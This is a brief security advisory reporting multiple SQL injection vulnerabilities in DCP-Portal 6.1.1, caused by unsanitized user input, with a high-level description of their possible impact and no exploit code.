DCP-Portal is reportedly affected by multiple SQL injection vulnerabilities. These issues exist because the application fails to properly sanitize user-supplied input before using it in SQL queries.

Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.

These vulnerabilities are reported to affect DCP-Portal 6.1.1; earlier versions may also be affected.
